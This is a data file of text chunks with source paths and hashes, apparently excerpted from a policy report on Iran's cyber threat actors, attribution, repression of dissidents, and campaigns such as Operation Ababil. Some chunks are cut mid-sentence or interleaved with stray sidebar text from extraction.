year."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|df2b7f62b9144595a567c8a42cc9cff9
"This marked one of the first known uses of offensive cyber operations as a coercive measure between states.6 While Stuxnet was solely intended to degrade Iran’s nuclear program, other campaigns sought to sabotage the country’s financial and oil infrastructure. In May 2012, a consor-

tium of researchers disclosed another destructive operation against Iran.7 Malware agents known as Wiper and Flame, successors to Stuxnet, had been discovered when Iran’s Ministry of Petroleum and the National Iranian Oil Company computers were disabled, their hard drives overwritten in a unilateral operation reportedly conducted by Israel.8 Coercive cyber operations targeting Iran continued following Operation Olympic Games. In June 2012, amid stalled nuclear negotiations between Iran and international powers, Tehran’s minister of intelligence claimed the country’s nuclear facilities were subject to another “massive cyber attack.”9 Later that year, Iran alleged additional disruptive operations targeting its Central Bank, Ministry of Culture, and drilling platforms operated by the Iranian Offshore Oil Company.10 In addition to sabotage, foreign intelligence agencies have continually targeted Iranian infrastructure for purposes of espionage, a fact made public to Iran through the intelligence disclosures of Edward Snowden. A former U.S. National Security Agency (NSA) worker, Snowden leaked a presentation on a tool known as Boundless Informant showing Iran to be one of the most highly surveilled countries in the world: billions of Iranian internet and telephone records have been collected by the intelligence agencies of the United States and its partners."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|a6573804660241f1b7d2d6904cf2e4d9
"In fact, Iran is so frequently surveilled that a Canadian espionage operation targeting Iran once stumbled across a French-run intelligence operation that had compromised the very same network.11

HOW IRAN EMBRACED CYBER REPRESSION Iran’s Supreme Leader Ayatollah Ali Khamenei has long believed Washington aspires to overthrow the Islamic Republic by instigating mass mobilization along the lines of the 1989 Velvet Revolution that toppled the Communist regime in Czechoslovakia.12 Following similar logic, Iran’s first cyber operations were motivated by fears that the internet facilitated external threats to regime stability. Tehran often labels the online dissent of its citizenry as cyberwarfare orchestrated by its enemies, namely the United States, to subvert the Islamic Republic. Western government support for unrestricted internet access and Persian-language satellite television stations—such as BBC Persian TV—are perceived as key elements of this strategy. The advent of social media sites, such as Facebook and Twitter, and messaging apps, such as Telegram, are especially threatening given they challenge the Iranian government’s long-standing monopoly over media and communications. Khamenei’s greatest concerns were realized when the June 2009 contested reelection of hardline president Mahmoud Ahmadinejad—amid widespread allegations of fraud—provoked Iran’s largest popular uprisings since the country’s 1979 revolution. It was also a

pivotal moment in the Iranian government’s embrace of offensive cyber capabilities, as this mass mobilization—known as the Green Movement—became one of the first known targets of the regime’s operations. The online contest between the opposition, using the internet to coordinate political resistance, and the government, attempting to repress mobilization, set the stage for future conflicts, including those with foreign powers. Soon after an estimated 2 million Iranians protested in Tehran on June 15, 2009, supporters of the Green Movement began to battle the government over control of information.13 When the authorities expelled foreign media, interfered with mobile phone networks, and arrested prominent critics, the internet became a primary channel for coordination amid the chaos.

Security agencies had adapted to the modern digital environment, with interrogations by the IRGC including an intimate review of an arrestee’s personal life based on printed copies of his or her online communications and social media.

Movement demonstrated to the Islamic Republic that the internet could be used as an instrument of mass mobilization and posed an effective challenge to the regime’s longheld information monopoly. The tactics, tools, and threat actors that arose during this domestic challenge to regime stability would foreshadow the cyber posture of Iran toward a wider set of internal and foreign threats. A recurrent theme since the outset of Iran’s cyber operations is that Iranian campaigns do not maintain clear boundaries between operations directed against its internal opposition and those directed against foreign adversaries.19 The same infrastructure and tools used by Iranian threat actors for campaigns against the American defense industry are also used to target Persian-language women’s development programs; the same malware used in destructive attacks against Saudi government institutions had been previously used for surveillance against members of the Green Movement opposition."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|69e195fb0a304e20b8fbb750710c4233

Unlike the cyber operations of the United States and Israel, which are conducted by professional intelligence services supported by billion dollar budgets, Iran’s offensive and defensive capabilities are disorganized and modestly funded.20 Thus, while Iran frequently turns to disruptive attacks to apply pressure, it faces a ceiling of capability and opportunity in its ability to threaten opponents. Tehran’s clandestine human intelligence gathering in foreign countries, particularly outside the Middle East, is of similarly low sophistication. Tehran rarely claims responsibility for offensive cyber operations attributed to it, including those espousing support for the Islamic Republic, and has made contradictory statements on its cyber posture. Iranian authorities have a history of embellishing the country’s military capacity, including for cyber operations."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|dd8314fa28044e9eb112fa2f54089c71
In responding to a series of disruptions of its own infrastructure in October 2012, then minister of intelligence Heidar Moslehi asserted that “the Islamic Republic is so powerful in the cyber space that [even] leaders of the arrogant powers admit and acknowledge our country’s successes.”21 However, IRGC commander Mohsen Kazemeini also claimed that the IRGC’s cyberwarfare division was not tasked with conducting offensive operations.22 Official rhetoric also appears to conflate the state’s effort to push online propaganda with offensive cyber capabilities, leading to claims of tens of thousands of cyber warriors. Iran has used reports of destructive incidents to portray itself as a victim of foreign aggression, deflect attention away from its own actions, and boast of its ability to neutralize potential attacks.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|703e9b8e1ac84aacacc266b310b9e155
"When accused by the United States of having conducted a disruptive attack against American banks, Iran’s Deputy Foreign Minister Hossein Jaberi Ansar responded that “the U.S. government, which put millions of innocent people at the risk of an environmental disaster through cyber attacks against Iran’s peaceful nuclear facilities, is not in a position to level accusations against the citizens of other countries, including those of Iran, without substantiated evidence.”23 Iranian officials appealed to international institutions for relief after the country had been affected by the malware agents Flame and Wiper, a move that aligned with its calls for greater United Nations (UN) control over the internet.24 In public statements, Iran has often emphasized its defensive capabilities, announcing in 2015 that its Cyber Attacks Emergency Center had successfully managed to thwart U.S. cyber attacks against the country’s industrial infrastructure.25 Iranian military officials regularly announce new defense products developed by domestic contractors, the most prominent example being the antivirus software Padvish.26 Despite these claims, Iran has shown little success in fostering a mature cybersecurity industry and lags behind both developed economies and key regional rivals in terms of investing in defense or formulating national policies to secure critical infrastructure.

Despite its confident claims, Iran is generally perceived as a third-tier cyber power, lacking an advanced indigenous cybersecurity apparatus capable of carrying out sophisticated operations like China, Israel, Russia, and the United States.28 While technical sophistication does not impede Iranians from conducting successful cyber operations, those actions reflect a disorganization and lack of professionalism that runs contrary to what would be expected of a state actor and limits their capabilities."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|9f3769601a544d2295645bb5f29e45d8
"Tehran’s political and economic isolation has further constrained it from acquiring technology and expertise from foreign governments or companies, and little evidence exists that would indicate substantial cooperation with other nations in the development of its offensive cyber capabilities.

THE DIFFERENCE BETWEEN ESPIONAGE AND SABOTAGE Media accounts of cyber operations often paint incidents with a broad brush, labeling all intrusions as attacks regardless of whether the outcome was destructive.29 Offensive cyber operations, however, can be more accurately labeled according to their intent and impact, distinguishing espionage and sabotage. Iranian actors have both engaged in intrusions to extract information from foreign networks (espionage, information gathering) and performed destructive actions to punish or coerce adversaries (sabotage), with a gray area in the middle related to signaling and other motivations. Understanding this difference is important in assessing Tehran’s strategy and the legality of its operations. International law differentiates activities that are legal, though not desirable, from those that are illegal and could prompt dangerous escalation.30 Just as international law differ-

entiates traditional espionage from coercion or violence, these same principles also apply to cyber espionage. Legal scholars have asserted that “mere intrusion into another State’s systems does not violate the non-intervention principle.”31 Indeed, given the growing number of nations with offensive cyber capabilities, espionage and information gathering through cyber operations has increasingly become accepted as an international norm.32 While the United States naturally denounces Tehran’s targeting of State Department employees, for example, such incidents mirror similar espionage operations against Iranian diplomats by U.S. and other Western intelligence agencies.33 International law experts have provided frameworks for determining what constitutes an “armed attack” in cyberspace, based on severity, invasiveness, directness, and other factors."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|283aef3882404fd991a6fb8353334655
"Such frameworks also reinforce the importance of terminology, differentiating, for example, espionage against the Navy Marine Corps Intranet from a destructive incident such as Iran’s attack on Saudi Arabia’s and the world’s largest oil company, Saudi Aramco.34 Relatedly, scholars have noted that Iran’s use of proxies in offensive cyber operations does not absolve the government of legal obligations or repercussions for their outcome, based in part on international case law from the 1979 Iranian hostage crisis.35 Consistent evaluation of the legality of Iranian cyber operations provides clearer public benchmarks for assessing when Iran violates internationally respected principles and engages in illegitimate behavior. As Tehran continues to conduct offensive cyber operations, it is important for policymakers to assess the intent, scope, and legality of Iran’s actions before considering counter responses.

CHAPTER TWO

IRAN’S CYBER ECOSYSTEM: WHO ARE THE THREAT ACTORS?

The Islamic Republic of Iran is unique in that its most powerful officials—namely Supreme Leader Khamenei and the Islamic Revolutionary Guard Corps—are inaccessible, while its most accessible officials—including Foreign Minister Javad Zarif—are far less powerful. Iran’s offensive cyber activities are almost exclusively overseen by the IRGC— likely without the oversight of the country’s publicly “elected” officials—and composed of a scattered set of independent contractors who mix security work, criminal fraud, and more banal software development. While the relationships between proxies and governments can range from passive support to complete control, Iran’s indigenous threat actors maintain an arm’s-length relationship to the state, with certain operations orchestrated to meet the needs of the government.36 After successfully suppressing the 2009 Green Movement and first detecting the Stuxnet attack in 2010, Iranian threat actors conducted sustained campaigns against domestic and foreign adversaries. These indigenous operations appear to be performed by small groups of individuals that have varying levels of technology experience with no more than ten people per team."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|32b6bf14ece840269624f403f74bf018
"These campaigns and the resources produced by the groups range from rudimentary to relatively professional, but most actors still face a low capacity ceiling.37 Though U.S. officials and some cybersecurity companies have speculated that Tehran has received technical assistance from countries like Russia and North Korea, the level of sophistication is commensurate with the established practices of amateur hacking communities inside Iran.38 While Iranians have demonstrated talents in social engineering and

embedding themselves in compromised networks, this alone is not indicative of external training or technological transfers. On several occasions, Iranian threat actors have used off-the-shelf or pirated versions of professional penetration testing tools to conduct campaigns, but there is little indication of Tehran acquiring exploits or malware from foreign governments. Iran has acquired hardware for internet surveillance from Chinese telecommunication firms and maintains cooperative agreements with Russia on cybersecurity; however, these relationships differ from providing Tehran with offensive cyber capabilities.39 No publicly documented or privately observed attack has demonstrated the use of tools or resources that are beyond the capacity of Iranian threat actors. In principle, the tools and tactics used in cyber operations are subject to an exposure risk. Unlike conventional weapons, malware attacks or other cyber activities lose their effectiveness when discovered and when their functionality and infrastructure is documented. Describing a missile does not provide effective countermeasures, but describing malware can provide antivirus companies and system administrators the ability to protect systems. State-aligned threat actors will likely not employ the most sophisticated tools and strategies available to them unless the target is well protected and worth potentially exposing tradecraft to compromise."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|83f77075122446e88d883cd193ecef08
However, unlike in other countries, there are not observed examples from Iranian threat actors of escalation into more sophisticated attacks against hardened targets.40 Iranian threat actors conduct campaigns with established toolkits that sometimes last for years and ensnare hundreds of targets. However, the fluid nature and decentralization of these groups make them relatively difficult to track. Malware that is publicly attributed to Tehran is often abandoned immediately on exposure, and identifiable members appear to change groups over time. Some groups seem to split up, have members move elsewhere, or even collaborate, further blurring lines.41 For example, while an IRGCaffiliated group labeled Rocket Kitten was the most active operator for a two-year period (2014–2016), attracting press attention as Iran’s premiere threat, it has since faded into quiescence, eclipsed by the actor Oilrig.42 Despite their substantial financial impact, Tehran’s disruptive operations against foreign targets have been technically simple. The compromise of a small number of IT personnel enabled the destruction of data on computers maintained by Saudi Aramco, eventually resulting in hundreds of millions of dollars in damage.43 In only a few campaigns have Iranian threat actors shown the professionalism and sophistication approaching that expected of a nation-state actor; in one such case, the operation could be tied directly to the Ministry of Intelligence (Magic Kitten, discussed later).44|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|8dc8157bd64a4f319394d478a2ecdae5

IRAN’S CYBER THREAT

Success can often be attributed to security failures and to poor protection of infrastructure on the part of the victim, alongside opportunistic targeting and patience by the attacker. The defacement of Voice of America’s websites by the Iranian Cyber Army, one of the first disruptive attacks by Iran against the United States, was accomplished through social engineering the news agency’s domain name service provider.45 Other basic security failures gave Iranians a toehold in the networks of Las Vegas Sands Corp. after its owner, Sheldon Adelson, advocated military force against Iran.46 Symantec, an American cybersecurity company, noted that the perpetrators of a recent Saudi-focused campaign had invested a “significant amount of preparatory work for the operation,” but the custom malware was described by Russian cybersecurity firm Kaspersky as “generally of low quality” partially derived from open-source toolkits.47 Similarly, a major attack on the American financial sector—known as Operation Ababil—which caused hundreds of millions of dollars in damage, was described as one of the largest DDoS attacks known at the time."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|ea4535659538460f888e550665116244
Yet it took only a few young Iranian computer experts, breaching thousands of websites that were running vulnerable software, to pool enough bandwidth to overwhelm the infrastructure of banks and cause unpredicted software failures.48 Thus, while Iranian threat actors have limited capacity, through basic tradecraft and persistence they can still be effective at espionage and sabotage. The overall sophistication and dedication observed in such campaigns has not significantly changed in the decade that Iran has engaged in offensive cyber operations—the attacks documented against Las Vegas Sands Corp. in 2014 are comparable to those used against Saudi Arabia in renewed hostilities over the course of 2016-2017. Indeed, many research disclosures cover groups that have been active for several years, using the same malware with only incremental changes over the course of time.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|bc5bd0e1f4b048cbb9d8f04e0a125e03
"While sophistication alone can be a superficial metric of posed threat, Iranian operations do not demonstrate the common technical precautions taken by other nation-state actors (such as obfuscating malware), and, even with strong social engineering capabilities, attacks are often betrayed by a lack of investment in nontechnical resources (such as fluency in English or personal tailoring of messages).49 These resource constraints also account for why Iranians are more effective at compromising dissidents—Iranian threat actors understand their target’s context and language, as opposed to when they are tasked with European languages or other cultures. Iran shows little indication of becoming a first-tier cyber power in the foreseeable future unless it begins to further organize its operations and invest in professionalism.

MAGIC KITTEN In January 2015, the German news outlet Der Spiegel released previously unpublished documents on cyber espionage conducted by American intelligence agencies.50 One of them revealed an NSA tactic labeled “fourth party collection,” which is the practice of breaking into the command and control infrastructure of foreign-state-sponsored hackers to look over their shoulders. The presentation describes a real-life example of acquiring intelligence and stealing victims from a group code-named VOYEUR by the NSA, otherwise known as Magic Kitten. Magic Kitten appears to be among the oldest and most elaborate threat actors originating in Iran. It is also distinct from other groups because of its apparent relationship with the Iranian Ministry of Intelligence rather than the IRGC. However, Magic Kitten’s activities mirror those of other groups, with the primary targets being Iranians inside Iran and Tehran’s regional rivals. The earliest observed samples of Magic Kitten’s custom malware agent dates to 2007, well before other known malware apparently originated, and the threat actor continues to be active. Magic Kitten appears to exercise the most mature tradecraft of Iran-based threat actors. It has opportunistically compromised dozens of websites at random (including those of an Indian hospital, an Italian architect, and a well-known Canadian comedian) to create a relay network to hide its operations."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|41bbec94762245a5bced27fb36ea5e7f
"Such attention to tradecraft appears elsewhere in Magic Kitten’s operations, including in the design of malware, which is modular in nature. Magic Kitten has not been observed using sophisticated exploits and instead appears to rely on social engineering and other common tactics to deceive users. In the case of the journalist Vahid Pour Ostad, the malware was sent by his former Ministry of Intelligence interrogator with a threat attached and relied on private records that would have been available only to government actors. This coordination represents both independent confirmation of the NSA’s attribution and an extreme example of the strategies employed by Magic Kitten. Other samples of the malware agent appear to have been delivered posing as Turkish asylum forums for Syrian refugees.

IRAN’S CYBER THREAT

The NSA presentation also provides a window on Magic Kitten’s targets up to May 2011, portraying an operation focused on North America, Europe, and the Middle East. These campaigns continued through the June 2013 presidential election of Hassan Rouhani, provoking a blogpost from Google about related attacks.51 As the election approached, exposed logs showed the daily capture of dozens of accounts connected to Iranian cultural and media figures, graduate students, and social activists (including individuals that would later join the Rouhani administration). Magic Kitten continued to target Iranians after the election, attempting to unmask pseudonymous internet users by baiting them with content on women’s rights and the security establishment. Like other Iranian operations, Magic Kitten maintains a strong secondary interest in conducting espionage against regional targets and international foreign policy institutions. CrowdStrike, another American cybersecurity company, accounts for part of this focus on “international corporations, mainly in the technology sector” and other political targets.52 An NSA slide with a victim map portrays a broad-reaching operation targeting nearly every country in the Middle East."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|c9aefb0300cf40a78b9dda826dac4c25
"Sinkhole data collected from expired domains previously used as relays and other fallback infrastructure suggest that Magic Kitten, or the malware agent used, continues to actively compromise individuals in Germany, Indonesia, Iraq, Lebanon, the Netherlands, Palestine, Pakistan, Qatar, Sweden, Switzerland, Thailand, and the United Arab Emirates. Notably, compromised individuals in Iraq were also typically in Iraqi Kurdistan, mirroring a common pattern with other threat actors. A diagram within the NSA presentation suggests that the malware agent employed by Magic Kitten was also used at the time by Iran’s Shia Lebanese proxy Hezbollah, under independent infrastructure. While Hezbollah has been known to maintain its own offensive cyber operations and engage in intelligence sharing with Iran, there has been little prior evidence of direct sharing of tools.53

UNDERSTANDING IRANIAN GOVERNMENT INVOLVEMENT AND ATTRIBUTION It is often difficult to determine the origins and perpetrators of Iranian offensive cyber operations, as these campaigns may disappear as quickly as they appear. Public exposure often leads them to change tactics and abandon tools, making tracking even more difficult. The history of cyber operations targeting Iranians and originating from Iran is populated by groups that arise out of nowhere and conduct campaigns for ambiguous reasons over a finite time span, then disappear. This unusually frenetic character conspicuously differentiates the Iranian hacking ecosystem from that found elsewhere, particularly those tied to state actors in advanced countries. The history of cyber

The amateur hackers connected to the Iranian defacement community have long been politically engaged and have often vandalized foreign sites for ostensibly nationalistic reasons.54 In one of the first international incidents attributed to Iran, domestic hacking groups in mid-2008 exchanged tit-for-tat defacements with competitors in neighboring Arab countries after the official sites of Grand Ayatollah Ali al-Sistani were vandalized with anti-Shia content by an Emirati hacker. Such defacement activities can often evolve into state-affiliated activities: one of the participants in the anti-Sunni website-defacement campaign in 2008 was later linked to the Iranian Cyber Army. This transition from patriotic hackers to state-aligned threat actors, and the ambiguity between civic nationalism and state involvement, mirrors the apparent development of cyber communities in China and elsewhere.55 In only two incidents have Iranian government entities taken direct credit for the defacement of political opposition sites, both attributed to branches of the Revolutionary Guard. The first case was the March 2010 takedown of sites connected to the organization Human Rights Activists in Iran, which was alleged to be training cadres to mobilize against the regime like the Velvet Revolution. The attack relied on the arrest of a website administrator inside the country rather than on complicated tactics.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|47435c36168b4224912aeb20d178a80d
"The arrests and destruction of data had a lasting impact on the organization by instilling fear in members and giving rise to rumors about collaboration with the government. The second government-initiated campaign, carried out during a Shia holiday in December 2013, led to the defacement of nine human rights and independent media websites

with a Quranic verse in Arabic and Persian. The IRGC’s Public Relations Department announced that the operation had been conducted by the Revolutionary Guard’s Kerman Branch and claimed that the defaced websites had been established by the country’s enemies and supported by internal seditionists. In most cases, Iran uses cutout or proxy organizations, allowing it to keep some distance from the disruptive incidents and propagandistic defacements. These cutouts represent themselves as patriotic Iranians or pan-Islamic movements acting independently in defense of the supreme leader, national sovereignty, and religious ideals. Conducting offensive cyber operations through covert organizations provides Tehran plausible deniability for any attacks, thereby protecting its claim to victimhood while also allowing the state to signal its intentions to its opponents.

When the U.S. Justice Department unsealed its Operation Ababil indictment in March 2016, it named two Iranian corporate entities that employed at least seven individuals who had been contracted by the Iranian government.57 The indictment implicated three of the participants as being part of the Sun Army, an Iranian cutout defacement group. The Sun Army followed the typical pattern found with the Iranian Cyber Army and other state-aligned defacements, arising out of nowhere to perform targeted political acts over a short life span. Its first documented defacements, in February 2010, were of sites connected to now-detained opposition leader Mehdi Karroubi. The vandalism accused him of being a traitor and was timed to blunt planned antigovernment street protests.58 As Iran’s cybersecurity landscape has professionalized, some defacement groups have sought to convert their infamy into corporate success. Based on the disclosure of personal information about threat actors, there are indications that those engaged in Iranian offensive cyber operations work within corporate entities (such as IT consultancies) or contractors of Iranian security forces.59 For example, aspects of the Madi espionage campaign

implicated the Mortal Kombat Underground Security Team, a small Iranian group that has attempted to sell spyware and other hacking tools since at least 2008.60 The frequent overlap of legitimate digital commerce sites and servers used for intrusion campaigns is demonstrative of these blurred lines—a company might simultaneously provide web design services for businesses and hack for the government.61 The transition of amateur hackers into contractors for state security agencies is reflected in basic qualities and patterns of life found across most threat actors. There are clear indications that the threat actors documented are solely Iranians operating inside Iran, not diaspora Iranians or non-Iranians. At the most basic level, they tend to follow the normal patterns of life of office workers, being active during the Iranian workweek (Saturday through Wednesday) Iranian threat actors have and dormant during Iranian holidays, particularly the long holiday of Nowruz, the Persian New Year. often used pornography as

Disclosures of aliases and real names, which may be discoverable because of a disregard for operational security due to insulation from repercussions or a lack of professionalism, help reveal both the lives and the motivations of Iranian threat actors. While those behind the groups may be nationalists or ideologically aligned with the regime, they do not appear to be enrolled members of the military or security apparatus. These individuals and groups also differ in social and religious predilections; some participants promote the use of narcotics and trade pornography on personal social media, while others are devoutly religious and embed Islamic references in malware code.

"CRITERIA FOR INDEPENDENT ASSESSMENT OF STATE INVOLVEMENT Campaigns conducted against dissidents and others inside Iran provide the most direct evidence of government involvement. Whereas it can be difficult to trace the consequences of foreign espionage, for those on the ground the implications are more direct and tangible.62 As a pattern builds between cyber operations and the offline actions of security forces, the relationship between both becomes clearer.63 While these cases of collaboration are discernible in only a few threat actors, the patterns support a broader narrative around the intrusion ecosystem.64 Indications that Iranians undertaking offensive cyber operations are associated with the government include the following:

The campaigns have been conducted based on information that appears to have been provided by security agencies. In certain cases, the campaigns have been carried out in coordination with government employees and in advance of the arrest of the target.

The targets of such operations align with the sensitivities of the Islamic Republic, and certain individuals are targeted repeatedly by multiple threat actors over time.

Persistent and costly campaigns have been sustained against thousands of targets without an apparent financial motive and without clear indication of the end use of the data obtained by intrusion."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|e14aa8350eec4328895be0eb4e8b2e5e
In rare cases, potential ties to the government are even disclosed by the participants themselves. A malware developer associated with the Rocket Kitten group, Yaser Balaghi, was identified by name based on a pseudonym found in the malware’s code. In a résumé from 2013, Balaghi listed past information security projects and a history of conducting hacking projects under contract to an otherwise unnamed “cyber-organization.”65 Balaghi is not alone in listing his hacking activities on his résumé; still other pseudonyms embedded in malware code used against Saudi Arabia and internal dissidents can be associated with LinkedIn profiles describing their experience as an “Information Security Researcher” with a “Secret” group. To add a complication common in cybersecurity research, it is often difficult to distinguish commonplace electronic fraud from politically motivated disruptions and statesponsored surveillance efforts, especially where the attacks are not sophisticated. In at least one case, Iranians that had staged persistent attempts against U.S. foreign policy organizations and two European foreign ministries had also maintained infrastructure linked with commercial banking fraud.66 In another example, the same social engineering skills used by an individual behind the Iranian Cyber Army defacements also proved successful in a career in the commercial theft of domains and PayPal fraud.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|9fa2cb5342a9459b84ec696ddcf1d01e
"More recently, in an indictment against an Iranian accused of attempting to extort HBO with stolen copies of unreleased television episodes in the summer of 2017, the U.S. Department of Justice claimed that the same individual had worked on behalf of the Iranian government to target military systems and Israeli infrastructure.67 Analyses of Iranian offensive cyber operations often rest on the country’s strict domestic controls as an indication of endorsement—that the government would not allow something to happen that it didn’t want to occur. However, Tehran’s controls are not so absolute, and many of the operations could occur surreptitiously given their simplicity. Cyber activity emanating from Iran could theoretically be conducted without the state’s sanction, consent, or even knowledge.

communications against surveillance. These tools provide space for Iranians to engage in actions against the government without persecution, and similarly can conceal cyber activities. Therefore, an Iranian origin does not alone indicate state sponsorship. Nor does the financial damage resulting from an operation, the political implications of the campaign, or the number of targets necessarily directly correlate with the probability of government involvement. The destructive operations conducted against Saudi Aramco resulted in millions of dollars in damages, yet the malware was unsophisticated and the attack did not require significant resources, putting the incident plausibly within reach of a sole individual acting without sponsorship. Such straightforward metrics of harm, then, are poorly informative of the degree of governmental involvement in cyber activities originating from Iran."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|bca5f4cb550f4b748299781f56a8008d
GOVERNMENT ENTITIES AND THREAT ACTORS The coordinated timing of cyber operations with politically motivated arrests are a strong indication of the Iranian government’s direct involvement. Since at least July 2014 a pattern has emerged: individuals in the custody of the IRGC are forced to provide access to their online accounts and devices, which are then immediately used to conduct spearphishing attacks associated with known threat actors. A vivid example of this coordination is the case of Iranian-American Siamak Namazi, a forty-six-year-old Dubai-based energy consultant and previously a scholar at the Woodrow Wilson International Center for Scholars in Washington, DC. In October 2015, he was arrested by Iranian security forces months after having had his passport confiscated while visiting the country. Within hours of his arrest, Namazi’s Google and Facebook accounts initiated conversations with his wide array of foreign policy and media contacts. The intruder, pretending to be Namazi, sent contacts an article about the recent nuclear deal and in poor English solicited edits on the document. This message was accompanied by an email directing the target to a fake Google site requiring visitors sign in to their account to view the document, a credential theft attempt connected to Rocket Kitten.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|74b991a807174bb699fdbaf9dd5501b0
"Numerous individuals were compromised in this campaign, including scholars, U.S. State Department employees, and one prominent journalist whose Gmail account— which included communications with former U.S. secretaries of state, CIA directors, and other foreign ministers—was overtaken by the Iranian hackers for nearly two days.68 This pattern has been repeated in numerous cases involving other Iranians, dual nationals, and foreign nationals detained in Iran.

IRAN’S CYBER THREAT

Cyber operations have also been documented in preparation for arrests.69 A prominent example of target selection prior to arrest is the case of Babak Zanjani, an Iranian-Danish businessman who had been personally sanctioned by the United States and European Union for involvement in Iranian sanctions evasion. After months of claims regarding his role in the embezzlement of oil revenue, a process that included a parliamentary investigation, at the end of December 2013 Zanjani was arrested and subsequently charged with “corruption on This overarching trend earth.”70 After an opaque judicial process, in March points to probable 2016 he was condemned to death, a sentence the Ministry of Justice indicated could be commuted if relationships between Zanjani cooperated in recovering Iran’s foreign assets. certain threat actors and A persistent effort targeted Zanjani’s personal accounts the intelligence agencies, and business infrastructure in the weeks immediately a business relationship preceding his arrest.

"Kitten) had acquired access to the confidential information of Sorinet subsidiaries and personnel; however, it is not clear whether any material accessed during this time was used in the investigation or prosecution of Zanjani. The case of Zanjani reflects a broader trend witnessed with other cases; Iranian threat actors frequently pursue online the types of individuals commonly persecuted by the Islamic Republic offline. The association between Iranian-origin cyber activities and Iran’s intelligence agencies is further supported by the fact that the data acquired during such operations is rarely disclosed. The Navy Marine Corps Intranet breach, the Las Vegas Sands Corp. incident, and the compromise of State Department employees have all led to the exfiltration of substantial amounts of highly sensitive information. There is no indication of ulterior motives, such as fraud, extortion, humiliation, or disclosure to the hardline press.72 The operations required costly infrastructure, including dedicated servers and dozens of domain names, in addition to personnel time. The activities must have provided some degree of income to their members, with the primary value being espionage. This overarching trend points to probable relationships between certain threat actors and the intelligence agencies, a business relationship that has been revealed when Iranians have been indicted by the United States for hacking.

CHAPTER THREE

IRAN’S EXTERNAL TARGETS

Given Iran’s inability to effectively challenge or deter better-prepared opponents, it has employed opportunistic destructive attacks to demonstrate its ability to retaliate. Particularly in the Middle East, Tehran can implicitly threaten cyber operations against the poorly defended economic and infrastructure resources of its opponents in the event of hostilities. Indeed, the disclosure of targets and victims of Iran’s regional cyber operations often include industries that appear to serve no other purpose than creating beachheads in rival countries, such as banks and airports. The intended effects of disruptive operations can vary, ranging from intimidation to destruction for foreign targets, and from embarrassment to existential harm for domestic opponents. The targeting or compromise of systems can alone be sufficient to communicate Tehran’s willingness and capability to inflict damage on opponents. This echoes Iran’s occasional threat to close the Strait of Hormuz—through which nearly 60 percent of the world’s oil supply passes on any given day—during times of crisis. Given the opacity of the Iranian government, however, the intended messages and expectations being signaled from Tehran can be easily misinterpreted, risking unintended conflict or escalation. Such destructive attacks are rare, however, compared to Iran’s espionage campaigns against foreign governmental and economic institutions."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|3d3fc531fd58403fb5801eeb4aab888f
"Increasingly these campaigns form not only the basis of retaliation during conflict but also an essential crisis response mechanism for handling emerging threats. For example, days after a September 2015 stampede killed over 450 Iranians attending the Hajj pilgrimage, domain names impersonating the Saudi government and Hajj Ministry were registered by known Iranian

threat actors.73 As relations and communications rapidly deteriorated between the two countries, particularly over the fate of a missing diplomat, cyber espionage became an information gathering tool for Tehran. Saudi Arabia aside, Denmark, Germany, Israel, and the United States are among the countries that have publicly disclosed espionage attempts by Iranian groups against their government, military, or scientific institutions.74 Tehran also targets neighboring countries throughout the Middle East. Despite the various threat actors that operate on behalf of the Iranian government, their behavior patterns—including whom they target—are generally consistent over time."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|3267daaad62742a88421a72ea3106c9d

Subsequent phases of the campaign were less effective as the financial sector steadily improved its defenses. By the fourth attempted attack, in July 2013, little visible impact resulted. Still, by the FBI’s account, Operation Ababil locked hundreds of thousands of banking customers out of accounts for long periods of time and resulted in tens of millions of dollars in costs to remediate. An NSA briefing document also made clear the motivation for Operation Ababil: “[Signals intelligence] indicates that these attacks are in retaliation to Western activities against Iran’s nuclear sector and that senior officials in the Iranian government are aware of these attacks.”75

IRAN’S CYBER THREAT

Operation Ababil remains the most destructive Iranian attack on the United States. While the International Atomic Energy Agency (IAEA) alleged that Tehran had electronically surveilled and tampered with the devices of visiting nuclear inspectors in 2011, little had been known about Iranian cyber espionage prior to 2012.76 That summer provided the first public indication that Iranian threat actors had staged campaigns to spy on rivals.77 The Madi malware campaign was reported to have compromised up to 800 victims over the course of a year. The countries and entities targeted were a harbinger of future Iranian cyber operations, including oil companies, U.S. Iranians attempted to think tanks, government agencies, engineering firms, compromise the personal financial institutions, and academia.

"email accounts of members of the American team during the nuclear negotiations.

